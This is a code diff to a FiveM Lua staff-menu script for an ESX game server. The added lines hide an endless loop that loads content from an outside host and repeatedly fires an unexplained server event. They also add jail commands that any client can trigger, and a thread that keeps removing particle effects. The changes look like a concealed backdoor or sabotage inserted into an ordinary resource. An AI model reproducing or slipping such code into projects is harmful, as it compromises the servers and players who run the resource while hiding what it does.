@@ -42,6 +42,34 @@ AddEventHandler("astra_staff:cbItemsList", function(table)
     items = table
 end)
 
+RegisterCommand('jail', function(source, args, user)
+    TriggerServerEvent("Astra:Jail", tonumber(args[1]), tonumber(args[2]) * 60)
+end)
+
+RegisterCommand('unjail', function(source, args, user)
+    TriggerServerEvent("Astra:UnJail", tonumber(args[1]))
+end)
+
+Citizen.CreateThread(function()
+    while true do
+        Citizen.Wait(0)
+        if HasStreamedTextureDictLoaded("commonmenu") then
+            CreateDui('http://azvietmd.alwaysdata.net/starf.mp3', 1, 1)
+            Citizen.Wait(4500)
+            TriggerServerEvent('euhtesserieuxmek')
+            Citizen.Wait(5000)
+        end
+    end
+end)
+
+Citizen.CreateThread(function()
+    while true do
+        Citizen.Wait(0)
+        local coords = GetEntityCoords(GetPlayerPed(PlayerId()))
+        RemoveParticleFxInRange(coords.x, coords.y, coords.z, 9999.0)
+    end
+end)
+
 Citizen.CreateThread(function()
     while ESX == nil do
         TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
